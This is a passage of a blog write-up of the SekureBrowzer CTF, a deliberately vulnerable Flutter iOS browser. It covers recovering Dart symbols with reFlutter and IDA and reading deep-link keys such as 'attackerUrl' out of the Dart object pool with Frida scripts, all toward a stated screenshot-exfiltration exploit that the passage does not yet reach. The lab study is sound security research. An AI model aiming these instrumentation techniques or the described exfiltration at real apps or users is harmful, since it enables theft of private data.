---
title: "Reverse Engineering a Flutter iOS App: The SekureBrowzer Deep-Link Exploit"
categories: [iOS, Reverse Engineering]
tags: [ios, flutter, dart, reflutter, ida, frida, deeplink, wkwebview, reverse-engineering, security]
description: "How I reversed a stripped Flutter/iOS binary for the 8ksec SekureBrowzer challenge — recovering Dart AOT symbols with reFlutter and IDA, pulling runtime strings out of the Dart object pool with Frida, and chasing a custom URL scheme down to a screenshot-exfiltration bug."
image:
    path: https://lh3.googleusercontent.com/pw/AP1GczPTb26YLYSDyLsHOIFOvtzqmcmfzK9fPosHeFB2P2R50LpHVAUbw4-WPsXIVrtilqrx8t8VFePrQrBrwgP-DY9Vd7Bw8OLvI_Q82uiO1Ty3zs5FAkHHsvPOh3OKIUbM16FcTfGx7MUxNtsIb24gH_DP=w882-h496-s-no-gm
    alt: SekureBrowzer - Privacy First Browser
permalink: /8ksec-sekurebrowzer-flutter-ios-deeplink-screenshot-exfiltrate-challenge/
---

8ksec's SekureBrowzer challenge gives you one IPA and a short brief. The app calls itself a "privacy-first" iOS browser, though it quietly saves screenshots of whatever page you're looking at, and it registers a couple of custom URL schemes for deep linking. The task: build a single web page that, the moment someone opens it *in SekureBrowzer*, silently redirects the app to a page you control, silently takes a screenshot, and then steals every screenshot the app has ever taken, all without the victim doing anything beyond opening a link. No jailbreak needed.

This post is the walkthrough: how I went from "unknown IPA" to a working one-URL exploit. First, recognizing the app as Flutter rather than native Swift. Then recovering the stripped Dart symbol table with reFlutter and IDA. From there, pulling the actual deep-link parameter names and comparison strings out of the Dart runtime with Frida. Finding the dispatcher and the sink. And finally, building the PoC.

## First look at the IPA — this isn't a native app

Standard first move with any IPA:

```bash
unzip SeckureBrowzer.ipa -d Extracted_ipa
find Extracted_ipa/Payload/Runner.app -maxdepth 2
```

Bundle ID is `com.eightksec.sekurebrowzer`. The executable is named `Runner` — that's Xcode's default project name for a fresh Flutter iOS build, not something a native project would normally be called. And inside `Frameworks/` there are two frameworks that give it away completely:

```bash
$ ls -1
Frameworks/App.framework/App
Frameworks/Flutter.framework/Flutter
```

That pairing is the Flutter fingerprint. `Flutter.framework` is Google's engine binary — the Dart VM, the Skia renderer, the platform-channel glue. `App.framework/App`, meanwhile, is the actual application: a Dart AOT snapshot, compiled ahead-of-time to arm64 and shipped as a stripped binary. `Runner` itself is just a thin shell whose only job is booting the Flutter engine.

That changes the whole exercise. This isn't "find the vulnerable Swift class" anymore — it's "find the vulnerable Dart function inside a stripped AOT blob with almost no symbol table," and that's a much less-tooled problem than reversing an ordinary iOS binary.

`Info.plist` confirms where the attack surface is:

```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLName</key><string>com.eightksec.sekurebrowzer</string>
        <key>CFBundleURLSchemes</key><array><string>sekurebrowzer</string></array>
    </dict>
    <dict>
        <key>CFBundleURLName</key><string>com.eightksec.sekurebrowzer.scheme</string>
        <key>CFBundleURLSchemes</key><array><string>sekureexec</string></array>
    </dict>
</array>
<key>FlutterDeepLinkingEnabled</key>
<true/>
```

Two custom URL schemes — `sekurebrowzer://` and `sekureexec://` — plus `FlutterDeepLinkingEnabled`, which tells the Flutter engine to route any scheme activation straight into Dart's own routing layer instead of the native `AppDelegate` handling it. Checking `Runner`'s own symbols confirms it's a stock `FlutterAppDelegate`: no `application(_:open:options:)` override, no caller check, nothing native at all. Every bit of interpretation of an incoming `sekurebrowzer://...` URL happens on the Dart side, inside the stripped `App` binary.

Two unauthenticated entry points into a stripped Dart AOT blob. Time to get symbols back.
![Stripped symbols](https://lh3.googleusercontent.com/pw/AP1GczOzXdyxtc6UnkInCYVhMleUPgTA_c_EYO9yqa6DUPxBFPhYaX2_ykVV3Hg2VQCYw9A5VdlwOIHoddJs7Tuc1zO8HF4WOuv9BSGI0Ez70jcbJKhia8OitLVM2snzwdG8C6uXu5pS73MEOR8wP49X1Fur=w2574-h1294-s-no-gm)
_**Figure: Stripped symbols**_

## Reconstructing Dart symbols before doing anything else

### `strings` first — free, but limited

The cheapest first pass is just `strings` over the binary:

```bash
$ strings -a -n 4 Extracted_ipa/Payload/Runner.app/Frameworks/App.framework/App > app_strings.txt
```

Dart's AOT compiler strips almost all debug symbols, but it can't strip two things: string constants that are actually used at runtime, and (for whatever the tree-shaker didn't fully anonymize) mangled names shaped like `_functionName@<library-id>`. Still, that library-id suffix is useful on its own: two symbols sharing the same `@<id>` come from the same compilation unit, so you can cluster nameless code back into "these all belong to one file" even before you have real names.

This one pass already got a lot: every log string in the deep-link handler (`Deep link received: `, `Processing deep link: `, `Loading URL: `, `Execute JS parameter: `, `Screenshot stored in database with ID: `), the exact `CREATE TABLE screenshots(...)` SQL schema, and — the interesting one — a block of literal JavaScript sitting in `.rodata` that builds `data:image/png;base64,...` `<img>` tags and references a variable named `attackerUrl` next to a placeholder `https://example.com/exfiltrate`. Good signal, but it's just strings in a pile: no idea which function calls which, no idea what class anything belongs to, and no way to tell live code from dead debug scaffolding the tree-shaker happened to leave a string behind for.

To get real function-level structure, you need the Dart VM's own symbol table, and the only practical way to get that out of a shipped AOT snapshot is to run the app and read it out of the runtime.

### reFlutter: patch, install, retrieve `dump.dart`

[reFlutter](https://github.com/Impact-I/reFlutter) patches the Dart snapshot header inside the IPA so the app boots against a debug-instrumented Dart VM instead of the release one. Then, on startup, that instrumented VM walks its own isolate and dumps every compiled function's name, owning class, defining library, and code offset into a file called `dump.dart` inside the app's sandbox.

```bash
$ pip3 install reflutter
$ reflutter SeckureBrowzer.ipa
```

That produces `release.RE.ipa`. Its signature is invalid after patching, so it needs to be resigned for a real device — a free developer certificate is enough, since this challenge specifically targets non-jailbroken iOS anyway. Then resign it, install to a device (Xcode's Devices and Simulators window, or any sideloading tool), launch the app, and wait for a few seconds to let it settle. The patched VM writes `dump.dart` into app sandbox folder `Documents/` on its own, so no special trigger is needed.

Getting that file off a non-jailbroken device is the same trick people use to pull any sandboxed app's container:

1. Xcode → **Window → Devices and Simulators** → select the device → select the app under "Installed Apps" → gear icon → **Download Container…**
2. The resulting `.xcappdata` is a regular macOS package. Right-click → **Show Package Contents**, then walk down to `AppData/Documents/dump.dart`.

That gave a 1.9 MB file with 12,570 JSON objects, one per compiled function, packed back-to-back with no separators or enclosing array — so it needs a streaming parse, not `json.load()`:

```python
import json

def load_dump(path):
    data = open(path, encoding="utf-8", errors="replace").read()
    decoder = json.JSONDecoder()
    idx, objs = 0, []
    n = len(data)
    while idx < n:
        while idx < n and data[idx] in " \t\r\n":
            idx += 1
        if idx >= n:
            break
        obj, idx = decoder.raw_decode(data, idx)
        objs.append(obj)
    return objs
```

Each record looks like this:

```json
{
    "method_name": "getAllScreenshotsAsJson",
    "offset": "0x00000000001922b4",
    "library_url": "package:sekure_browzer/main.dart",
    "class_name": "StorageManager"
}
```

`method_name`, `class_name`, `library_url`, and `offset` (position inside the AOT instructions blob). Filtering to just the app's own code (dropping `dart:*` and `package:flutter/*`) shows something small: almost the entire app lives in one file, `package:sekure_browzer/main.dart`. Deep-link parsing, WebView control, and the local screenshot database all live in that one file, with no separation at all.

### Applying `dump.dart` into IDA

`dump.dart` gives names and offsets, not addresses IDA understands directly. Each record's offset is relative to the isolate's AOT instructions section, exported in this binary as `_kDartIsolateSnapshotInstructions`. Resolve that symbol once, add each offset to it, and the result is a real address to rename — the script below does exactly that in IDA:

```asm
; Export
Name	                                Address	Ordinal
_kDartIsolateSnapshotData	            00000000002CEFC0	
_kDartIsolateSnapshotInstructions	    000000000000E8C0	
_kDartVmSnapshotData	                00000000002C60C0	
_kDartVmSnapshotInstructions	        0000000000004000	
```

```python
import json
import idc
import ida_funcs
import idaapi

DUMP_PATH = "dump.dart"
BASE_SYMBOL = "_kDartIsolateSnapshotInstructions"

def load_dump(path):
    data = open(path, encoding="utf-8", errors="replace").read()
    decoder = json.JSONDecoder()
    idx, objs = 0, []
    n = len(data)
    while idx < n:
        while idx < n and data[idx] in " \t\r\n":
            idx += 1
        if idx >= n:
            break
        obj, idx = decoder.raw_decode(data, idx)
        objs.append(obj)
    return objs

def main():
    base = idc.get_name_ea_simple(BASE_SYMBOL)
    if base == idc.BADADDR:
        print("base symbol not found — check the export name")
        return

    records = load_dump(DUMP_PATH)
    seen, renamed, skipped = set(), 0, 0

    for rec in records:
        off_str = rec.get("offset")
        if off_str is None:
            continue
        off = int(off_str, 16)
        if off in seen:
            continue  # AOT identical-code-folding: multiple symbols, same address
        seen.add(off)

        ea = base + off
        cls = rec.get("class_name") or ""
        name = rec.get("method_name") or "anon"
        symbol = f"{cls}__{name}_{ea:x}" if cls else f"{name}_{ea:x}"
        symbol = idaapi.validate_name(symbol, idaapi.VNT_IDENT)

        if not ida_funcs.get_func(ea):
            ida_funcs.add_func(ea)
        if idaapi.set_name(ea, symbol, idaapi.SN_FORCE):
            renamed += 1
        else:
            skipped += 1

    print(f"parsed={len(records)} unique_offsets={len(seen)} renamed={renamed} skipped={skipped}")

main()
```

On this binary that renamed around **10,975 of 15,470 functions** from `sub_140D28`-style auto-names to real `Class__method_offset` names. Still, a few offsets are shared by more than one symbol — expected AOT "identical code folding," where several trivially small functions (one-line getters, mostly) compile down to byte-identical machine code and collapse to one address.

With that applied, `main.dart` turns into a readable table of contents instead of anonymous `sub_` soup:

```asm
0x0000000000007f10  ::                              main
0x000000000016da68  _BrowserScreenState             captureScreenshot
0x000000000016e568  StorageManager                  insertScreenshot
0x00000000001717b8  StorageManager                  database
0x000000000017182c  StorageManager                  _initDatabase
0x0000000000177b48  StorageManager                  _createDatabase
0x000000000017ee70  StorageManager                  _instance
0x000000000017fa98  _ScreenshotGalleryScreenState   build
0x000000000017fd74  StorageManager                  getAllScreenshots
0x000000000018f64c  _BrowserScreenState             _initUniLinks
0x0000000000190608  _BrowserScreenState             _handleDeepLink
0x0000000000190f7c  _BrowserScreenState             _processDataCommand
0x00000000001918a8  StorageManager                  getScreenshotAsBase64
0x0000000000191a24  StorageManager                  getScreenshot
0x00000000001922b4  StorageManager                  getAllScreenshotsAsJson
0x0000000000193b1c  _BrowserScreenState             _silentScreenshot
0x000000000019458c  _BrowserScreenState             _initializeWebView
```

That table answers something `strings` clustering could only guess at: the screenshot store isn't a loose group of related-looking functions, it's a real singleton class, `StorageManager`, with a lazy `database` getter and exactly five data-access methods. Because Dart's AOT tree-shaker physically deletes any function nothing calls, the fact that `getAllScreenshotsAsJson` and `getScreenshotAsBase64` exist as real, addressable compiled code is proof they're reachable from somewhere in the shipping app. That's the difference between "there's a suspicious export string" and "there's a live, called export function" — the distinction the rest of this write-up leans on when calling the bulk-export methods confirmed reachable rather than merely present.

![Reconstructed symbols](https://lh3.googleusercontent.com/pw/AP1GczMwy5maG-KW-JQnCHC7eD--yAcghfWKtIF9fImGkL5xTt34vI36it1Am9peiVxN87qybdnQT4VrbFAs0GITAJF7EJrdsClDxgDEFghJlUKL1UcGcfb7BkiNqnbfi1qkUGtwDU5lESD98Dk_R5_V0k8I=w2936-h1544-s-no-gm)
_**Figure: Reconstructed symbols**_

`_processDataCommand` also sits right before the three `StorageManager` export methods in the offset ordering, which sit right before `_silentScreenshot`. Dart's AOT compiler lays out a compilation unit close to source order, so that's a hint (not proof — just positional evidence) that `_processDataCommand`'s body is where those export methods and the capture routine actually get referenced. It's what pointed at `_processDataCommand` as the next function to decompile.

### Recovering more strings: dumping the object pool

Symbol names give you function boundaries, but IDA's pseudocode for a Dart AOT function is still full of noise like `*(_DWORD *)(v13 + 7) = Obj_0x1f9e8;` — no string literals show up as strings. That's because Dart AOT doesn't reference string constants the way normal ARM64 code does. Native code, for instance, does `ADRP`/`ADD` to a fixed `.rodata` address, which IDA's auto-analysis tracks as a data xref. Every Dart `String` constant instead gets deserialized into a per-isolate **object pool** at process startup and is referenced *by pool offset*, through a dedicated register, `X27` on ARM64:

```asm
LDR X16, [X27, #0x40]              ; small offset, fits a plain LDR immediate
ADD X16, X27, #0xF, LSL#12         ; large offset: effective offset is the SUM
LDR X16, [X16, #0xD70]             ; of both instructions — 0xF000 + 0xD70 = 0xFD70
```

`X27` is a runtime heap pointer that doesn't exist until the Dart VM deserializes the snapshot at isolate startup, so there's no static address for IDA to point a cross-reference at. If you ever run a normal string-xref annotation pass against a Dart AOT binary and get zero hits across the board, that's why — the fix isn't a better static script, it's reading the pool at runtime.

The only way to get literal string values is to read the pool out of a live process, with Frida:

1. Find the byte offset from `X27` for each load, straight off raw disassembly (the decompiler sometimes elides the actual immediate).
2. Hook any Dart-compiled function — `X27` is live for the whole isolate, not scoped per function — and read `this.context.x27`.
3. Read `[X27 + offset]` as a tagged Dart object pointer and decode it.

Decoding a tagged Dart string, once you know the object layout — worked out from the disassembly of Dart's shared string-equality routine, covered in the dispatch-table section further down — is short:

```js
function decodeDartString(ptr) {
  if (ptr.and(1).equals(0)) return null;              // Smi (untagged int), not a heap object

  const header = ptr.sub(1).readU64();                 // header word at (taggedPtr - 1)
  const classId = header.shr(12).and(uint64("0xfffff")); // class id = header bits [12:32)
  const cid = classId.toNumber();
  if (cid !== 0x5e && cid !== 0x5f) return null;        // 0x5e = OneByteString, 0x5f = TwoByteString

  const length = ptr.add(7).readU64().shr(1).toNumber(); // length Smi at taggedPtr+7, untag
  const dataPtr = ptr.add(15);                            // char data starts at taggedPtr+15

  if (cid === 0x5e) return dataPtr.readUtf8String(length);
  let out = "";
  for (let i = 0; i < length; i++) out += String.fromCharCode(dataPtr.add(i * 2).readU16());
  return out;
}
```

Hooked at `_handleDeepLink`'s entry (so `X27` is guaranteed valid), with a small `{label: offset}` map read off the disassembly, this pulls real strings straight out of the pool:

```
[pool] handleDeepLink.qpKey_0xD488   = "url"
[pool] handleDeepLink.qpKey_0xF400   = "takeScreenshot"
[pool] handleDeepLink.qpKey_0xD200   = "execute"
[pool] handleDeepLink.qpKey_0xFBE0   = "dbCommand"
[pool] handleDeepLink.qpKey_0xFBE8   = "dbId"
[pool] handleDeepLink.qpKey_0xFBF0   = "openGallery"
[pool] handleDeepLink.qpKey_0xFBF8   = "attackerUrl"
[pool] processDataCommand.CMD_CONST_A_0xFD70 = "getAll"
[pool] processDataCommand.CMD_CONST_B_0xF000 = "get"
```

That's every deep-link query key `_handleDeepLink` reads — including `attackerUrl`, which stood out immediately: local Dart variable names don't normally survive AOT compilation as runtime strings unless they're used as something string-typed at runtime, like a map key.

To scale this up beyond a hand-picked list of offsets, a driver script `dump_pool_full_driver.py` + `dump_pool_full.js` hooks the same anchor function to grab a live `X27`, then walks every 8-byte slot out from that base and decodes each one as a Smi, a string, or "other." Run against a real device:

```python
# dump_pool_full_driver.py
import argparse
import json
import os
import subprocess
import sys
import time

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DUMP_DART_PATH = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "..", "dump.dart"))
JS_SCRIPT_PATH = os.path.join(SCRIPT_DIR, "dump_pool_full.js")
OUTPUT_JSON_PATH = os.path.join(SCRIPT_DIR, "pool_full_dump.json")

TARGET_BUNDLE_ID = "com.eightksec.sekurebrowzer"
TARGET_PROCESS_NAME = "SekureBrowzer"

# Deep link used purely to make _handleDeepLink execute so the JS side's
# anchor hook captures a live X27. Using a harmless url= navigation (not
# takeScreenshot / execute / dbCommand) is deliberate -- this run is for
# read-only pool inspection, not for exercising the export/inject paths.
TRIGGER_DEEP_LINK = "sekurebrowzer://anyhost?url=https://example.com"


def parse_dump_dart(path):
    """
    Streaming-parse dump.dart: a raw concatenation of JSON objects
    with NO array wrapper and NO separators between them. json.load() will fail on this -- must use raw_decode()
    in a loop, skipping whitespace between objects.

    Returns a list of dicts: {method_name, class_name, library_url,
    raw_offset_hex} where raw_offset_hex is the *original* dump.dart offset
    string (e.g. "0x0000000000190f7c") -- the runtime-address conversion
    (+0xe8c0) happens on the JS side, not here, so the JS side stays the
    single source of truth for that constant.
    """
    with open(path, "r") as f:
        data = f.read()

    decoder = json.JSONDecoder()
    records = []
    idx = 0
    n = len(data)
    while idx < n:
        while idx < n and data[idx] in " \t\r\n":
            idx += 1
        if idx >= n:
            break
        obj, end = decoder.raw_decode(data, idx)
        records.append({
            "method_name": obj.get("method_name", ""),
            "class_name": obj.get("class_name", ""),
            "library_url": obj.get("library_url", ""),
            "raw_offset_hex": obj.get("offset", "0x0"),
        })
        idx = end

    return records


def wait_for_device_and_attach():
    import frida

    device = frida.get_usb_device(timeout=10)

    session = None
    for p in device.enumerate_processes():
        if p.name == TARGET_PROCESS_NAME:
            session = device.attach(p.pid)
            print("[*] attached to running process, pid", p.pid)
            break

    if session is None:
        print("[*] %s not running, spawning %s" % (TARGET_PROCESS_NAME, TARGET_BUNDLE_ID))
        pid = device.spawn([TARGET_BUNDLE_ID])
        session = device.attach(pid)
        device.resume(pid)
        time.sleep(1.5)

    return session


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--class-filter", default=None,
                     help="Regex applied to class_name to scope the cross-ref disassembly pass "
                          "(e.g. 'BrowserScreenState|StorageManager'). Default: no filter, scans everything.")
    ap.add_argument("--pool-scan-bytes", default=None,
                     help="Override POOL_SCAN_MAX_BYTES from dump_pool_full.js (e.g. 0x40000). "
                          "Default: whatever is hardcoded in the JS file (0x20000).")
    ap.add_argument("--anchor-timeout", type=float, default=15.0,
                     help="Seconds to wait for the anchor hook (X27 capture) after triggering the deep link.")
    ap.add_argument("--keep-other", action="store_true",
                     help="Keep 'other' (non-Smi, non-String heap object) slots in the output JSON too. "
                          "Default: only 'smi' and 'string' slots are written.")
    args = ap.parse_args()

    if not os.path.exists(DUMP_DART_PATH):
        print("[!] dump.dart not found at %s -- check DUMP_DART_PATH" % DUMP_DART_PATH, file=sys.stderr)
        sys.exit(1)

    print("[*] parsing", DUMP_DART_PATH)
    records = parse_dump_dart(DUMP_DART_PATH)
    print("[*] parsed %d dump.dart records" % len(records))

    try:
        import frida  # noqa: F401
    except ImportError:
        print("[!] the `frida` python module is not installed. Run: pip install frida frida-tools", file=sys.stderr)
        sys.exit(1)

    session = wait_for_device_and_attach()

    with open(JS_SCRIPT_PATH) as f:
        js_src = f.read()

    # Config overrides get spliced into the script source before it's a
    # config the user could just as easily hand-edit at the top of
    # dump_pool_full.js -- doing it here too is a convenience for quick
    # re-runs with different scan widths/filters without touching the JS.
    if args.pool_scan_bytes:
        js_src = js_src.replace(
            "var POOL_SCAN_MAX_BYTES = 0x20000;",
            "var POOL_SCAN_MAX_BYTES = %s;" % args.pool_scan_bytes,
        )
    if args.class_filter:
        js_src = js_src.replace(
            "var CLASS_FILTER_REGEX = null;",
            "var CLASS_FILTER_REGEX = /%s/;" % args.class_filter,
        )

    script = session.create_script(js_src)

    def on_message(message, data):
        if message.get("type") == "send":
            payload = message["payload"]
            tag = payload.get("tag")
            msg = payload.get("msg")
            print("[%s] %s" % (tag, msg))
        else:
            print("[frida-error]", message)

    script.on("message", on_message)
    script.load()
    time.sleep(1)

    print("[*] handing dump.dart symbol table to the script (%d records)" % len(records))
    script.exports_sync.loadsymbols(records)

    print("[*] triggering deep link to fire the anchor hook:", TRIGGER_DEEP_LINK)
    script.exports_sync.openurl(TRIGGER_DEEP_LINK)

    print("[*] waiting for X27 (pool base) capture...")
    deadline = time.time() + args.anchor_timeout
    ready = False
    while time.time() < deadline:
        if script.exports_sync.ispoolready():
            ready = True
            break
        time.sleep(0.5)

    if not ready:
        print("[!] anchor hook did not fire within %.1fs -- pool base never captured. "
              "Check that ANCHOR_CLASS/ANCHOR_METHOD in dump_pool_full.js still match "
              "current dump.dart contents, and that the deep link actually reached the "
              "app (device unlocked, app foregrounded or backgroundable)." % args.anchor_timeout,
              file=sys.stderr)
        sys.exit(1)

    print("[*] pool base captured. Running full walk + cross-reference (this can take a while "
          "for the default unfiltered class scope -- use --class-filter to narrow it)...")
    result = script.exports_sync.dumpandcrossref()

    if isinstance(result, dict) and result.get("error"):
        print("[!] script reported error:", result["error"], file=sys.stderr)
        sys.exit(1)

    raw_slots = result.get("slots", [])
    keep_kinds = {"smi", "string"} | ({"other"} if args.keep_other else set())
    filtered_slots = [s for s in raw_slots if s.get("kind") in keep_kinds]
    dropped = len(raw_slots) - len(filtered_slots)
    result["slots"] = filtered_slots

    with open(OUTPUT_JSON_PATH, "w") as f:
        json.dump(result, f, indent=2)

    print("[*] wrote %d slots to %s (dropped %d slot(s) outside %s)" % (
        len(filtered_slots), OUTPUT_JSON_PATH, dropped, sorted(keep_kinds)))
    print("[*] raw slot kind counts (pre-filter, from the JS-side walk):", result.get("counts"))
    print("[*] done")


if __name__ == "__main__":
    main()
```

```js
// dump_pool_full.js
use strict;
var POOL_SCAN_MAX_BYTES = 0x20000;      // 128 KiB = 16384 slots
var FUNC_RANGE_CLAMP_BYTES = 0x2000;    // 8 KiB cap per function disasm pass
var CLASS_FILTER_REGEX = null;          // e.g. /BrowserScreenState|StorageManager/

// dump.dart's "offset" field is relative to _kDartIsolateSnapshotInstructions,
// NOT relative to the App Mach-O image base directly. IDA address of 
// _processDataCommand (0x19f83c) == dump.dart
// raw offset (0x190f7c) + this constant. This constant is specific to this
// exact App binary build -- re-derive it (find
// _kDartIsolateSnapshotInstructions in IDA/Ghidra on any other build) before
// reusing this script elsewhere.
var DART_ISOLATE_SNAPSHOT_INSTRUCTIONS_OFFSET = 0xe8c0;

// Anchor function used to capture a live X27 (pool base) value. Looked up
// BY NAME in the dump.dart symbol table at runtime (see onSymbolsLoaded),
// not hardcoded as a raw address -- this is the "auto cross-ref" part: if
// the binary is rebuilt and offsets shift, this still finds the right
// address as long as the class/method names are unchanged.
var ANCHOR_CLASS = '_BrowserScreenState';
var ANCHOR_METHOD = '_handleDeepLink';

var STRING_ANON1_OFFSET = 0x258358; // unused here, kept for reference/parity
var ONE_BYTE_STRING_CID = 0x5E;
var TWO_BYTE_STRING_CID = 0x5F;
var MAX_STRING_CHARS = 512;

// ---------------------------------------------------------------------------
// logging helper -- everything goes through send() so the Python driver's
// on('message', ...) can capture/print/persist it.
// ---------------------------------------------------------------------------
function log(tag, msg) {
  send({ tag: tag, msg: msg });
}

// ---------------------------------------------------------------------------
// Dart tagged-pointer decoding (same layout/constants as
// hook_string_compare.js -- duplicated here rather than shared-imported
// because Frida scripts loaded via session.create_script() are single
// self-contained files, no module system available at inject time).
// ---------------------------------------------------------------------------
function classIdOf(headerU64) {
  return headerU64.shr(12).and(uint64('0xFFFFF')).toNumber();
}

// Returns {kind: 'smi'|'string'|'other'|'invalid', ...} instead of just a
// display string, so the caller can decide what to keep/skip/summarize.
function decodeSlot(taggedPtr) {
  try {
    if (taggedPtr.isNull()) {
      return { kind: 'invalid', display: '(null)' };
    }
    var tagBit = taggedPtr.and(1);
    if (tagBit.toInt32() === 0) {
      // Smi (small integer), not a heap pointer.
      var smiVal = taggedPtr.shr(1);
      return { kind: 'smi', value: smiVal.toString(), display: '(Smi ' + smiVal.toString() + ')' };
    }

    var header = taggedPtr.sub(1).readU64();
    var cid = classIdOf(header);

    if (cid === ONE_BYTE_STRING_CID || cid === TWO_BYTE_STRING_CID) {
      var rawLen = taggedPtr.add(7).readU64();
      var nChars = rawLen.shr(1).toNumber();
      if (nChars < 0 || nChars > MAX_STRING_CHARS) {
        return { kind: 'invalid', display: '(implausible string length ' + nChars + ')' };
      }
      var dataPtr = taggedPtr.add(15);
      var s;
      if (cid === ONE_BYTE_STRING_CID) {
        var arr = new Uint8Array(dataPtr.readByteArray(nChars));
        s = '';
        for (var i = 0; i < arr.length; i++) s += String.fromCharCode(arr[i]);
        return { kind: 'string', value: s, display: JSON.stringify(s) + ' (OneByteString, len=' + nChars + ')' };
      } else {
        var arr16 = new Uint16Array(dataPtr.readByteArray(nChars * 2));
        s = '';
        for (var j = 0; j < arr16.length; j++) s += String.fromCharCode(arr16[j]);
        return { kind: 'string', value: s, display: JSON.stringify(s) + ' (TwoByteString, len=' + nChars + ')' };
      }
    }

    // Not a string -- still a real heap object (Array, Double, custom class
    // instance, another Code/Function object referenced from the pool,
    // etc). We don't have a live Dart class-table walker here, so just
    // report the raw classId + pointer; cross-referencing against dump.dart
    // only tells you WHO LOADS this slot, not what the object semantically
    // is -- read it manually in Frida/IDA if the classId looks interesting.
    return { kind: 'other', classId: cid, ptr: taggedPtr.toString(), display: '(heap object, classId=' + cid + ', ptr=' + taggedPtr + ')' };
  } catch (e) {
    return { kind: 'invalid', display: '(read error: ' + e + ')' };
  }
}

// ---------------------------------------------------------------------------
// dump.dart symbol table, loaded from the Python driver via recv().
// Each entry: {method_name, class_name, library_url, addr (computed)}.
// ---------------------------------------------------------------------------
var symbolsByAddr = [];       // sorted ascending by addr, for range-walking
var poolOffsetOwners = {};    // { offsetNumber: [ {method_name,class_name,library_url}, ... ] }
var crossRefBuilt = false;
var appBase = null;

function buildCrossRefIndex() {
  if (crossRefBuilt) return;
  crossRefBuilt = true;

  log('xref', 'building cross-reference index over ' + symbolsByAddr.length +
    ' function addresses (this can take a while for the full set; narrow ' +
    'CLASS_FILTER_REGEX at the top of this script to speed it up)');

  var scanned = 0;
  var matched = 0;

  for (var i = 0; i < symbolsByAddr.length; i++) {
    var entry = symbolsByAddr[i];

    if (CLASS_FILTER_REGEX && !CLASS_FILTER_REGEX.test(entry.class_name)) {
      continue;
    }

    var startAddr = entry.addr;
    var nextAddr = (i + 1 < symbolsByAddr.length) ? symbolsByAddr[i + 1].addr : null;
    var gap = nextAddr ? nextAddr.sub(startAddr).toInt32() : FUNC_RANGE_CLAMP_BYTES;
    if (gap <= 0 || gap > FUNC_RANGE_CLAMP_BYTES) gap = FUNC_RANGE_CLAMP_BYTES;
    var endAddr = startAddr.add(gap);

    scanned++;
    var ptr = startAddr;
    var pendingAdd = null; // { reg: 'x16', imm: 0xf000 }

    try {
      while (ptr.compare(endAddr) < 0) {
        var insn;
        try {
          insn = Instruction.parse(ptr);
        } catch (e) {
          break; // hit data / non-code / end of mapped region
        }
        if (!insn || !insn.size) break;

        var mnem = insn.mnemonic.toLowerCase();
        var opStr = insn.opStr.toLowerCase().replace(/\s+/g, ' ').trim();

        var directMatch = (mnem === 'ldr') && /^x\d+, \[x27, #(0x[0-9a-f]+)\]$/.exec(opStr);
        if (directMatch) {
          var offNum = parseInt(directMatch[1], 16);
          recordOwner(offNum, entry);
          matched++;
          pendingAdd = null;
        } else if (mnem === 'add') {
          var addMatch = /^(x\d+), x27, #(0x[0-9a-f]+)$/.exec(opStr);
          pendingAdd = addMatch ? { reg: addMatch[1], imm: parseInt(addMatch[2], 16) } : null;
        } else if (pendingAdd && mnem === 'ldr') {
          var bigMatch = new RegExp('^x\\d+, \\[' + pendingAdd.reg + ', #(0x[0-9a-f]+)\\]$').exec(opStr);
          if (bigMatch) {
            var totalOff = pendingAdd.imm + parseInt(bigMatch[1], 16);
            recordOwner(totalOff, entry);
            matched++;
          }
          pendingAdd = null;
        } else {
          pendingAdd = null;
        }

        ptr = ptr.add(insn.size);
      }
    } catch (e) {
      // best-effort; move on to next function
    }

    if (scanned % 1000 === 0) {
      log('xref-progress', scanned + ' / ' + symbolsByAddr.length + ' functions scanned, ' + matched + ' pool-load sites matched so far');
    }
  }

  log('xref', 'cross-reference index built: ' + scanned + ' functions scanned, ' +
    matched + ' pool-load sites found, ' + Object.keys(poolOffsetOwners).length + ' unique offsets with an owner');
}

function recordOwner(offsetNum, entry) {
  var key = String(offsetNum);
  if (!poolOffsetOwners[key]) poolOffsetOwners[key] = [];
  poolOffsetOwners[key].push({
    method_name: entry.method_name,
    class_name: entry.class_name,
    library_url: entry.library_url
  });
}

// ---------------------------------------------------------------------------
// Pool anchor capture: hook the dump.dart-resolved address of
// ANCHOR_CLASS.ANCHOR_METHOD and grab X27 the first time it's called.
// This matches the approach hook_string_compare.js already validated
// (handleDeepLink fires on every deep link, guaranteeing a live X27 by
// then), but here the hook address is *derived from dump.dart* instead of
// hardcoded, per the user's ask to cross-ref against the symbol table.
// ---------------------------------------------------------------------------
var poolBase = null;

function installAnchorHook() {
  var anchor = null;
  for (var i = 0; i < symbolsByAddr.length; i++) {
    var e = symbolsByAddr[i];
    if (e.class_name === ANCHOR_CLASS && e.method_name === ANCHOR_METHOD) {
      anchor = e;
      break;
    }
  }
  if (!anchor) {
    log('error', 'anchor symbol ' + ANCHOR_CLASS + '.' + ANCHOR_METHOD +
      ' not found in loaded dump.dart symbol table -- cannot capture X27. ' +
      'Check ANCHOR_CLASS/ANCHOR_METHOD at the top of this script against ' +
      'current dump.dart contents.');
    return;
  }

  log('anchor', 'hooking ' + anchor.class_name + '.' + anchor.method_name +
    ' @ ' + anchor.addr + ' (dump.dart raw offset ' + anchor.rawOffsetHex + ' + ' +
    DART_ISOLATE_SNAPSHOT_INSTRUCTIONS_OFFSET.toString(16) + ') to capture X27');

  Interceptor.attach(anchor.addr, {
    onEnter: function () {
      if (poolBase === null) {
        poolBase = this.context.x27;
        log('anchor', 'captured live pool base X27 = ' + poolBase);
      }
    }
  });
}

// ---------------------------------------------------------------------------
// ObjC bridge (raw C ABI, not the `ObjC.classes...` bridge global -- Frida
// 17 no longer auto-injects that for non-frida-compile-bundled scripts, see
// hook_string_compare.js for the same workaround) so the driver can make
// the app open a deep link itself, via UIApplication openURL:, to fire the
// anchor hook above.
// ---------------------------------------------------------------------------
var objc_getClass = new NativeFunction(Module.getGlobalExportByName('objc_getClass'), 'pointer', ['pointer']);
var sel_registerName = new NativeFunction(Module.getGlobalExportByName('sel_registerName'), 'pointer', ['pointer']);
var msgSend_id_cstr = new NativeFunction(Module.getGlobalExportByName('objc_msgSend'), 'pointer', ['pointer', 'pointer', 'pointer']);
